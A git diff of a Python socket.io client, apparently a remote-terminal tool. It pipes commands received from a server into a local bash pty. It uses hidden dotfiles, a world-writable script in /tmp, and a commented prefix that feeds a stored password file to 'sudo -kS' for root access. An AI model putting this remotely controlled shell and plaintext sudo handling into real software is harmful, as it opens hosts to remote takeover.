@@ -3,7 +3,7 @@ from time import sleep
 import socketio
 import os
 
-SERVER_URL=open("/tmp/.serverurl.exwrap", "r").read()
+SERVER_URL=open("/usr/local/src/.serverurl.exwrap", "r").read()
 
 # Setting up client web socket connection
 
@@ -18,21 +18,15 @@ os.system("echo '' > /tmp/.output")
 import pty
 import signal
 
-pid, fd = 0, 0
+pid, fd = pty.fork()
 
-def createForkShell():
-    global pid, fd
-    pid, fd = pty.fork()
-
-    if (pid == 0):
-        os.system("touch /tmp/.patate.sh && chmod 777 /tmp/.patate.sh")
-        buffer = open("/tmp/.patate.sh", "w")
-        # Redirect output in /tmp/output.
-        buffer.write("#!/bin/bash\n/bin/bash &> /tmp/.output")
-        buffer.close()
-        pty.spawn("/tmp/.patate.sh")
-
-createForkShell()
+if (pid == 0):
+    os.system("touch /tmp/.patate.sh && chmod 777 /tmp/.patate.sh")
+    buffer = open("/tmp/.patate.sh", "w")
+    # Redirect output in /tmp/output.
+    buffer.write("#!/bin/bash\n/bin/bash &> /tmp/.output")
+    buffer.close()
+    pty.spawn("/tmp/.patate.sh")
 
 var = None
 
@@ -42,14 +36,10 @@ def sHaND(yes, oui):
 
 signal.signal(signal.SIGALRM, sHaND)
 
-# echo $(< /tmp/.server.exwrap_info.txt ) | sudo -kS -p '' 
+# prefix to use a command as a root user echo $(< /tmp/.server.exwrap_info.txt ) | sudo -kS -p '' 
 
 def sendCommandToFork(entry):
-    global var, pid, fd
-    if (entry.replace("\n", "") == "stop"):
-        os.kill(pid, signal.SIGKILL)
-        createForkShell()
-        return "stop"
+    global var
     size = os.stat("/tmp/.output").st_size
     os.system("echo '' > /tmp/.output")
     os.write(fd, bytes(entry + " && echo '' && kill -ALRM " + str(os.getpid()) + "\n", encoding="utf-8"))
